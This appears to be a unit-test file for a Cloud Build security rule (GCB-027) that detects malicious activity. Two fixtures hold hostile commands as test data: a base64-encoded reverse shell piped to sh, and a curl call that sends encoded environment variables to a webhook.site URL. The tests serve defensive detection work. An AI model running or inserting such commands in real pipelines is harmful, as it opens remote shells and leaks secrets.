"""Unit tests for GCB-027 (malicious-activity indicators)."""
from __future__ import annotations

from typing import Any

from pipeline_check.core.checks.cloudbuild.rules import (
    gcb027_malicious_activity as r27,
)


def _doc(**fields: Any) -> dict[str, Any]:
    return dict(fields)


class TestGCB027MaliciousActivity:
    def test_fails_on_base64_decode_exec(self):
        doc = _doc(steps=[
            {"name": "gcr.io/cloud-builders/bash", "args": [
                "-c",
                "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= "
                "| base64 -d | sh",
            ]},
        ])
        f = r27.check("cloudbuild.yaml", doc)
        assert not f.passed
        assert f.check_id == "GCB-027"

    def test_fails_on_exfil_webhook(self):
        doc = _doc(steps=[
            {"name": "gcr.io/cloud-builders/curl", "args": [
                "https://webhook.site/abc?env=$(env|base64)"]},
        ])
        assert not r27.check("cloudbuild.yaml", doc).passed

    def test_passes_on_clean_build(self):
        doc = _doc(steps=[
            {"name": "gcr.io/cloud-builders/docker", "args": [
                "build", "-t", "gcr.io/$PROJECT_ID/app", "."]},
        ])
        assert r27.check("cloudbuild.yaml", doc).passed
